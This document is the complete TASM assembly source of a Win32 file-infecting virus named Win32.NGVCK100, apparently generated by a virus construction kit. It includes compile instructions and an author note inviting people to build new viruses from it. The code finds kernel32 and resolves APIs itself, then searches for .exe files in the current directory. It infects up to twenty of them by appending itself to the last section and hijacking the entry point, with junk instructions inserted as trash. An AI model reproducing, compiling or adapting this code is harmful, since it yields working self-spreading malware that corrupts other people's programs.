              
;
;
; Win32.NGVCK100 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK100
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 29
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebx
                                        ; mov ebp, ebx
 mov ebp, ebx
 sub ebp, offset Delta
 jmp KernelSearchStart


;                  [ ///// * Data * \\\\\ ]

Data:

 APIOffsets:
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XFindClose             dd 0h


 APINames:
 db 'CreateFileMappingA', 0
 db 'CloseHandle', 0
 db 'MapViewOfFile', 0
 db 'CreateFileA', 0
 db 'SetFileAttributesA', 0
 db 'GetFileAttributesA', 0
 db 'FindNextFileA', 0
 db 'FindFirstFileA', 0
 db 'UnmapViewOfFile', 0
 db 'FindClose', 0

 Trash1      dd 0h
 Attributes  dd 0h
 TempAPI     dd 0h
 AlignReg1   dd 0h
 AlignReg2   dd 0h
 KernelPE    dd 0h
 FindHandle  dd 0h
 NewEIP      dd 0h
 KernelMZ    dd 0h
 InfCounter  dd 0h
 K32Trys     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 counter     dw 0h
 db 'Win32.NGVCK100 of SnakeByte',0
 NTableVA    dd 0h
 TempApisearch3 dd 0h
 OTableVA    dd 0h
 OldBase     dd 400000h
 NewSize     dd 0h
 FileHandle  dd 0h
 MapAddress  dd 0h
 ATableVA    dd 0h
 OldEIP      dd 0h
 MapHandle   dd 0h
 filemask    db '*.eXE',0




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 xor edx, edx
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 add eax, 1d
 mul ecx
 sar ebx, 12d                           ; Trash
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 and word ptr [ebp+counter], 0h




 push dword ptr [ebp+NTableVA]
 pop ecx


SearchNextApi1:                         ; search for the API's
 push ecx
 mov edx, dword ptr [ecx]
 add edx, [ebp+KernelMZ]
                                        ; mov ecx, edx
                                        ; clear ecx
 and ecx, 0
 add ecx, edx
                                        ; mov edi, ecx
 push ecx
 pop edi
 push eax
 push edi
 mov dword ptr [ebp+TempApisearch3], ebx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dl, byte ptr [edi]
 mov dword ptr [ebp+Trash1], 921068     ; Trash
 cmp dl, byte ptr [ebx]
 jne ApiNotFound
 dec eax
 test eax, eax
 jz FoundApi1
                                        ; add edi, 1
 inc edi
                                        ; add ebx, 1
 add ebx, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop eax
 pop ecx
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 add ecx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
 pop ebx
 pop edi
                                        ; retrieve the offset
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov esi, edx
 movzx edx, word ptr [esi]
 sal edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [edx]
 add ecx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
                                        ; mov ebx, 20
 mov ebx, 20d
 mov dword ptr [ebp+InfCounter], ebx
 mov edi, offset filemask
 add edi, ebp

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 cmp eax, 0
 je EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 lea ecx, [ebp+WFD_szFileName]
 xchg esi, ecx

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 add ebx, ecx                           ; Trash
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ecx
 xor ecx, ecx
 push ecx
 push edx
 adc ebx, ebx                           ; Trash
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop edx
 or eax, eax
 jz CloseFile
                                        ; clear ecx
 sub ecx, ecx
 push edx
 push ecx
 push ecx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]

 push esi
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edi, [ebp+WFD_szFileName]

                                        ; mov ebx, 276
 mov ebx, 276d

ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 sub edi, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]

 push eax
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea edi, [ebp+WFD_szFileName]
 xchg edx, edi

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea ebx, [ebp+WFD_szFileName]


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear ecx
 push 0
 pop ecx
 mov cx, word ptr [edi+3Ch]
 dec ecx
 inc ecx
 jz Notagoodfile
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],eax
 jb Notagoodfile
 xor ecx, 25346828d                     ; Trash
 add eax, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
                                        ; clear ebx
 mov ebx, 0
 dec ebx
 inc ebx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [ebp+Attributes]
 push ecx
 mov ecx, offset WFD_szFileName
 add ecx, ebp
 adc dword ptr [ebp+Trash1], ecx        ; Trash

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ecx,12345678h
 org $-4
 retEIP dd 0h
 add ecx,12345678h
 org $-4
 retBase dd 0h
 push ecx
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax
 sub ebx, ebx                           ; Trash

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi



                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea ebx, [ebp+APINames]

 lea edi, [ebp+APIOffsets]
 xchg edi, esi


GetApisLoop: 

 push ebx
 pop eax
APINameDetect:                          ; calculate the lenght of the names
 add eax, 1d
 cmp byte ptr [eax], 0
 jne APINameDetect

 push eax
 sub dword ptr [esp], ebx
 pop eax
                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; ebx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 add ebx, eax
                                        ; add ebx, 1
 sub ebx, -1d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], edx
                                        ; add esi, 4
 add esi, 4d
 dec ecx
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; mov ebx, -1
 mov ebx, ( -1d - 1d )
 add ebx, 1d
 and ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, ebx
 add eax, [ebx+3Ch]
                                        ; get File Alignment
                                        ; add eax, 60
 add eax, 60d
 mov ebx, [eax]
                                        ; mov ecx, 60
 mov ecx, ( 60d xor 10d )
 xor ecx, 10d
 sub eax, ecx
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ebx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ecx
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ebx, esi
 add ebx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push ebx
 pop esi
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 add edx, -1
 imul edx, edx, 28h
                                        ; add ebx, 120
 add ebx, 120d
 add ebx, edx
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, dword ptr [esi+74h]
 clc
 rcl ecx, 3
 add ebx, ecx
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ecx
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
                                        ; clear ecx
 and ecx, 0

 add ecx, [ebx+10h]
                                        ; mov eax, ecx
 push ecx
 pop eax
 add ebx, 14h
 add ecx, [ebx]
 sub ebx, 14h
 push ecx
 push eax
 pop edx
 add edx, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], edx
                                        ; clear edx
 push 0
 pop edx

 add edx, [ebx+10h]
 push edx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], 0h
 add dword ptr [ebx+10h], edx
 pop edx
 add edx, VirusSize
 mov dword ptr [ebx+08h], edx
 mov edx, dword ptr [ebx+10h]
 add edx, dword ptr [ebx+0Ch]
 adc dword ptr [ebp+Trash1], edx        ; Trash
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea ecx, [ebp+Virus]
 xchg ecx, esi

 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 add ecx, -1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop esi
 push esi
                                        ; round to pages
 xor si, si
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 3h

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je CheckPE

GK2:
 add esi, -65536d
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov edx, [esi]
 inc esi
 sub esi, 61d
 neg esi
 sub edx, esi
 neg esi
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], esi
 mov dword ptr [ebp+KernelPE], edx
                                        ; clear edi
 mov edi, -21654d
 add edi, 21654d
 add edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, -29870d
 add ecx, 29870d
 add ecx, [edi+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov edi, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [ecx]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; get OTableVA
 mov edi, dword ptr [ecx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
 mov esi, offset GetApis
 add esi, ebp

 push esi
ret

CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

